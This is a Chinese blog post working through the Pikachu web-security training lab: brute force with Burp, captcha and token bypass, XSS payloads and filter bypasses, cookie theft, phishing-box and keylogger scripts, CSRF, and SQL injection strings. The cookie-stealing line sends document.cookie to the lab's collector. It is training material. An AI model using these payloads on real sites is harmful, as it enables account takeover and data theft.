<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>pikachu靶场 | 大白</title><meta name="author" content="大白"><meta name="copyright" content="大白"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="pikachu">
<meta property="og:type" content="article">
<meta property="og:title" content="pikachu靶场">
<meta property="og:url" content="https://dabai5269.top/post/ecb6de2c.html">
<meta property="og:site_name" content="大白">
<meta property="og:description" content="pikachu">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/wallhaven-nrqmmm.jpg">
<meta property="article:published_time" content="2023-07-30T09:05:50.000Z">
<meta property="article:modified_time" content="2023-08-13T10:02:40.915Z">
<meta property="article:author" content="大白">
<meta property="article:tag" content="靶场">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/wallhaven-nrqmmm.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://dabai5269.top/post/ecb6de2c"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'pikachu靶场',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-08-13 18:02:40'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/universe.css"><link rel="stylesheet" href="/css/background.css"><link rel="stylesheet" href="/css/rightMenu.css"><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="大白" type="application/atom+xml">
</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">10</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/wallhaven-nrqmmm.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">大白</a></span><div id="weather"><div id="tp-weather-widget"></div></div><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">pikachu靶场</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-07-30T09:05:50.000Z" title="发表于 2023-07-30 17:05:50">2023-07-30</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-08-13T10:02:40.915Z" title="更新于 2023-08-13 18:02:40">2023-08-13</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>14分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="pikachu靶场"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><h3 id="基于表单的暴力破解"><a href="#基于表单的暴力破解" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h3><p>挂上代理，抓包，选择clusterbomb模式，设置两个payload</p>
<p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230720143541566.png" alt="image-20230720143541566"></p>
<p>分别将字典导入payload1和payload2，开始爆破</p>
<p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230720144032127.png" alt="image-20230720144032127"></p>
<p>admin和123456登录成功</p>
<p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230720144158701.png" alt="image-20230720144158701"></p>
<h3 id="验证码绕过-on-server"><a href="#验证码绕过-on-server" class="headerlink" title="验证码绕过(on server)"></a>验证码绕过(on server)</h3><p>输入用户名，密码，验证码进行抓包</p>
<p>发送到重放器发现，只更改用户名和密码，页面显示</p>
<p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230720144826758.png" alt="image-20230720144826758"></p>
<p>再尝试改一下验证码，发现验证码错误</p>
<p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230720144952690.png" alt="image-20230720144952690"></p>
<p>猜测一个验证码可以进行多次登录，直接将用户名和密码作为payload位置就可以</p>
<h4 id="原理，源码"><a href="#原理，源码" class="headerlink" title="原理，源码"></a>原理，源码</h4><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230720145550989.png" alt="image-20230720145550989"></p>
<h3 id="验证码绕过-on-client"><a href="#验证码绕过-on-client" class="headerlink" title="验证码绕过(on client)"></a>验证码绕过(on client)</h3><p>根据提示，查看js代码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> code; <span class="comment">//在全局 定义验证码</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">createCode</span>(<span class="params"></span>) &#123;</span><br><span class="line">        code = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> codeLength = <span class="number">5</span>;<span class="comment">//验证码的长度</span></span><br><span class="line">        <span class="keyword">var</span> checkCode = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;checkCode&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> selectChar = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>,<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;F&#x27;</span>,<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;I&#x27;</span>,<span class="string">&#x27;J&#x27;</span>,<span class="string">&#x27;K&#x27;</span>,<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;M&#x27;</span>,<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;O&#x27;</span>,<span class="string">&#x27;P&#x27;</span>,<span class="string">&#x27;Q&#x27;</span>,<span class="string">&#x27;R&#x27;</span>,<span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;T&#x27;</span>,<span class="string">&#x27;U&#x27;</span>,<span class="string">&#x27;V&#x27;</span>,<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>,<span class="string">&#x27;Z&#x27;</span>);<span class="comment">//所有候选组成验证码的字符，当然也可以用中文的</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; codeLength; i++) &#123;</span><br><span class="line">            <span class="keyword">var</span> charIndex = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * <span class="number">36</span>);</span><br><span class="line">            code += selectChar[charIndex];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//alert(code);</span></span><br><span class="line">        <span class="keyword">if</span> (checkCode) &#123;</span><br><span class="line">            checkCode.<span class="property">className</span> = <span class="string">&quot;code&quot;</span>;</span><br><span class="line">            checkCode.<span class="property">value</span> = code;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">validate</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> inputCode = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#bf_client .vcode&#x27;</span>).<span class="property">value</span>;</span><br><span class="line">        <span class="keyword">if</span> (inputCode.<span class="property">length</span> &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="title function_">alert</span>(<span class="string">&quot;请输入验证码！&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (inputCode != code) &#123;</span><br><span class="line">            <span class="title function_">alert</span>(<span class="string">&quot;验证码输入错误！&quot;</span>);</span><br><span class="line">            <span class="title function_">createCode</span>();<span class="comment">//刷新验证码</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">createCode</span>();</span><br></pre></td></tr></table></figure>

<p>我们可以发现验证码是JavaScript随机生成，点击一次函数运行一次生成一个相应的验证码。</p>
<p>将数据包发送到repeater，更改验证码进行发包依旧提示<img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230720150339335.png" alt="image-20230720150339335"></p>
<p>发现该验证码是javascript随机生成的，后台并没有进行校验，我们直接进行爆破就行了</p>
<h3 id="token防爆破"><a href="#token防爆破" class="headerlink" title="token防爆破?"></a>token防爆破?</h3><p>输入用户名，密码，发现每次发包token就会更新一次</p>
<p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230720150804635.png" alt="image-20230720150804635"></p>
<p>在密码输入框的下方多一个隐藏的输入框，记录的是token的信息，那么直接拿去burp上开始爆破</p>
<p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230720151146772.png" alt="image-20230720151146772"></p>
<p>模式选择 pitchfork 勾选两个参数，一个是密码，一个是token</p>
<p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230720151403216.png" alt="image-20230720151403216"></p>
<p>token参数选择递归提取类型</p>
<p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230720151756588.png" alt="image-20230720151756588"></p>
<p>点击选项找到<code>检索-提取</code>进行添加，先点击获得响应，再选中token，重定向选择为总是</p>
<p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230720152159863.png" alt="image-20230720152159863"></p>
<p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230720151931006.png" alt="image-20230720151931006"></p>
<p>再将线程设置为单线程</p>
<p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230720152345438.png" alt="image-20230720152345438"></p>
<p>根据长度判断</p>
<p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230720152522273.png" alt="image-20230720152522273"></p>
<p> 爆破成功，得到admin的密码为123456</p>
<h2 id="跨站脚本攻击-xss"><a href="#跨站脚本攻击-xss" class="headerlink" title="跨站脚本攻击(xss)"></a>跨站脚本攻击(xss)</h2><h3 id="反射型XSS-get"><a href="#反射型XSS-get" class="headerlink" title="反射型XSS(get)"></a>反射型XSS(get)</h3><p>反射性，一次性的，刷新页面之后弹窗消失。GET是以url方式提交数据的。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="number">666</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230725194934531.png" alt="image-20230725194934531"></p>
<h3 id="反射型XSS-post"><a href="#反射型XSS-post" class="headerlink" title="反射型XSS(post)"></a>反射型XSS(post)</h3><p> POST是以表单方式在请求体里面提交</p>
<p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230725195339871.png" alt="image-20230725195339871"></p>
<h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>存储型和反射型漏洞形成的原因是一样的，而存储型xss可以将脚本保存到后台，造成更大的伤害，也成为永久永久型xss。</p>
<p>永久型的xss，刷新页面后弹窗依旧存在</p>
<h3 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h3><p>这里是标签的href属性，直接javascript伪协议</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javascript:alert(6)</span><br></pre></td></tr></table></figure>

<p>出现弹窗</p>
<h3 id="DOM型xss-x"><a href="#DOM型xss-x" class="headerlink" title="DOM型xss-x"></a>DOM型xss-x</h3><p>查看源码</p>
<p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230726151924912.png" alt="image-20230726151924912"></p>
<p>发现还是href属性，构造一个闭合或使用javascript伪协议</p>
<h3 id="XSS盲打"><a href="#XSS盲打" class="headerlink" title="XSS盲打"></a>XSS盲打</h3><p>我们直接在输入框里插js代码，后端有漏洞就就可以<code>x</code>成功</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>登录后台账号，发现被弹</p>
<p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230729132816754.png" alt="image-20230729132816754"></p>
<h3 id="XSS之过滤"><a href="#XSS之过滤" class="headerlink" title="XSS之过滤"></a>XSS之过滤</h3><p>绕过方法</p>
<p>前端有过滤的，可以直接修改前端代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//大小写绕过</span><br><span class="line">&lt;sCRipt&gt;aLErt(&quot;xss&quot;)&lt;?/ScRipT&gt;</span><br><span class="line">//拼凑绕过</span><br><span class="line">&lt;scri &lt;script &gt;pt&gt;alert(&quot;xss&quot;)&lt;/scri &lt;/script&gt; pt&gt;</span><br><span class="line">//编码绕过</span><br><span class="line">&lt;img src=c onerror=&quot;alert(&quot;xss&quot;)&quot;/&gt; //img标签</span><br><span class="line">//html编码</span><br><span class="line">&lt;img src=c onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&quot;&gt; </span><br></pre></td></tr></table></figure>

<p>输入<code>&lt;script&gt;&quot;:#&#39;@</code></p>
<p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230729144851237.png" alt="image-20230729144851237"></p>
<p>应该是script被过滤了，大小写进行绕过</p>
<h3 id="xss之htmlspecialchars-函数"><a href="#xss之htmlspecialchars-函数" class="headerlink" title="xss之htmlspecialchars()函数"></a>xss之htmlspecialchars()函数</h3><p>htmlspecialchars() 函数把预定义的字符转换为 HTML 实体。</p>
<p>它可以将字符串中的特殊字符（如&lt;&gt;等）转换为了HTML实体，以防止跨站点脚本攻击（XSS）</p>
<p>输入<code>6666;&quot;&#39;&lt;&gt;</code>,查看源码，发现只有单引号<code>&#39;</code>没有被编码</p>
<p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230729184054693.png" alt="image-20230729184054693"></p>
<p>我们可以构造一个闭合，<code>&#39; onclick=&#39;alert(666)&#39;</code>,也可以输入<code>javascript:alert(666)</code></p>
<h3 id="xss之href输出和js输出"><a href="#xss之href输出和js输出" class="headerlink" title="xss之href输出和js输出"></a>xss之href输出和js输出</h3><p>输入<code>javascript:alert(666)</code></p>
<p>js输出的源码</p>
<p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230729184822985.png" alt="image-20230729184822985"></p>
<p>构造闭合<code>&#39;&lt;/script&gt;&lt;script&gt;alert(666)&lt;/script&gt;</code></p>
<h3 id="xss的危害"><a href="#xss的危害" class="headerlink" title="xss的危害"></a>xss的危害</h3><h4 id="获取cookie"><a href="#获取cookie" class="headerlink" title="获取cookie"></a>获取cookie</h4><p>我们利用pikachu的xss后台获取cookie</p>
<p>构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;document.location = &#x27;http://127.0.0.1/pikachu/pkxss/xcookie/cookie.php?cookie=&#x27; +document.cookie;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>将他输入反射型xss中，打开后台</p>
<p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230729190509558.png" alt="image-20230729190509558"></p>
<h4 id="钓鱼获取账户密码"><a href="#钓鱼获取账户密码" class="headerlink" title="钓鱼获取账户密码"></a>钓鱼获取账户密码</h4><p>嵌入代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script src=&quot;http://127.0.0.1/pikachu/pkxss/xfish/fish.php&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>会弹出一个登录框</p>
<p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230729191017804.png" alt="image-20230729191017804"></p>
<p>我们输入账号密码，数据会存到后台可以进行查看</p>
<h4 id="获取键盘记录"><a href="#获取键盘记录" class="headerlink" title="获取键盘记录"></a>获取键盘记录</h4><p>同源策略规定，两个不同域名之间不能使用JS进行相互操作。</p>
<p>所以我们需要允许跨域访问</p>
<p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230729201339674.png" alt="image-20230729201339674"></p>
<p>嵌入代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script src=&quot;http://127.0.0.1/pikachu/pkxss/rkeypress/rk.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>打开控制台，在页面随便敲键盘，在后台可以看到输入数据</p>
<p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230729201539875.png" alt="image-20230729201539875"></p>
<h2 id="CSRF-跨站请求伪造"><a href="#CSRF-跨站请求伪造" class="headerlink" title="CSRF(跨站请求伪造)"></a>CSRF(跨站请求伪造)</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>CSRF的攻击场景中攻击者会伪造一个请求(这个请求一般是一 个链接)，<br> 然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击也就完成了。</p>
<p>csrf攻击前，首先需要用户的权限，再诱导用户再点击这个请求完成攻击。</p>
<p>csrf是借用用户的权限进行攻击，xss是直接盗用用户的身份在进行攻击。</p>
<h3 id="CSRF-get-x2F-post"><a href="#CSRF-get-x2F-post" class="headerlink" title="CSRF(get&#x2F;post)"></a>CSRF(get&#x2F;post)</h3><p>GET型</p>
<p>进入修改信息的界面，提交修改信息的请求会在url中体现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=1&amp;phonenum=&amp;add=&amp;email=&amp;submit=submit</span><br></pre></td></tr></table></figure>

<p>我们在url中直接修改参数就可以了</p>
<p>POST型</p>
<p>post型是通过表单进行请求</p>
<p>我们可以利用bp抓包工具生成一个csrf poc</p>
<p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230731200210267.png" alt="image-20230731200210267"></p>
<p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230731200242543.png" alt="image-20230731200242543"></p>
<p>我们直接在浏览器运行一下</p>
<p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230731200408502.png" alt="image-20230731200408502"></p>
<p>提交申请，我们直接会跳转到个人中心，并且信息也被修改了</p>
<p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230731200625952.png" alt="image-20230731200625952"></p>
<h3 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF(Token)"></a>CSRF(Token)</h3><p>在修改信息时，可以在加一个token参数（随机，每次都不一样）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/pikachu/vul/csrf/csrftoken/token_get_edit.php?sex=2&amp;phonenum=&amp;add=&amp;email=&amp;token=1436064c7a4e2888e1609686874&amp;submit=submit</span><br></pre></td></tr></table></figure>

<p>每个token只能用一次，所以我们只能在修改信息前进行抓包，再修改信息。所以，token是防止csrf的一种方式。</p>
<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h3><p>SQL注入漏洞就是，前端的数据传到后台进行处理时，因没有做严格的过滤，导致数据中的sql语句执行，数据库被攻击。</p>
<h3 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h3><p>数字型不用考虑闭合<code>id=1 or 1=1#</code></p>
<p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806154234855.png" alt="image-20230806154234855"></p>
<h3 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h3><p>后台查询语句是<code>select id,email from member where username=&#39;$name&#39;</code></p>
<p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806154412848.png" alt="image-20230806154412848"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name=kobe&#x27; //mysql报错</span><br><span class="line">name=kobe&#x27;&#x27; //页面正常，判断为字符型</span><br><span class="line">name=kobe&#x27; or 1=1# //回显所有数据</span><br></pre></td></tr></table></figure>

<p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806154906784.png" alt="image-20230806154906784"></p>
<h3 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h3><p>后台查询语句</p>
<p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806155415980.png" alt="image-20230806155415980"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select username,id,email from member where username like &#x27;%$name%&#x27;</span><br></pre></td></tr></table></figure>

<p>构造闭合</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kobe%&#x27; or 1=1# //回显所有信息</span><br></pre></td></tr></table></figure>

<p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806155816877.png" alt="image-20230806155816877"></p>
<h3 id="insert-x2F-update注入"><a href="#insert-x2F-update注入" class="headerlink" title="insert&#x2F;update注入"></a>insert&#x2F;update注入</h3><p>后台语句</p>
<p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806160254337.png" alt="image-20230806160254337"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into member(username,pw,sex,phonenum,email,address) values(&#x27;&#123;$getdata[&#x27;username&#x27;]&#125;&#x27;,md5(&#x27;&#123;$getdata[&#x27;password&#x27;]&#125;&#x27;),&#x27;&#123;$getdata[&#x27;sex&#x27;]&#125;&#x27;,&#x27;&#123;$getdata[&#x27;phonenum&#x27;]&#125;&#x27;,&#x27;&#123;$getdata[&#x27;email&#x27;]&#125;&#x27;,&#x27;&#123;$getdata[&#x27;add&#x27;]&#125;&#x27;)</span><br></pre></td></tr></table></figure>

<p>这个insert语句我们直接就在<code>住址(Add)</code>这个参数进行注入，闭合前面的sql只需要加入<code>&#39;$payload)</code>(前后分别加入单引号和右括号)</p>
<p>我们利用updatexml()函数进行报错注入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">111&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1))#</span><br></pre></td></tr></table></figure>

<p>concat是将符号与字符拼接在一起</p>
<p>0x7e是16进制,是这个符号<code>~</code></p>
<p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806162153532.png" alt="image-20230806162153532"></p>
<h3 id="delete注入"><a href="#delete注入" class="headerlink" title="delete注入"></a>delete注入</h3><p>后台语句</p>
<p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806162335917.png" alt="image-20230806162335917"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">delete from message where id=&#123;$_GET[&#x27;id&#x27;]&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806162541721.png" alt="image-20230806162541721"></p>
<p>这是数字型不需要进行闭合</p>
<p>其余跟insert注入是一样的</p>
<h3 id="http-header-注入"><a href="#http-header-注入" class="headerlink" title="http header 注入"></a>http header 注入</h3><p>以下是一些常见的请求header：</p>
<ol>
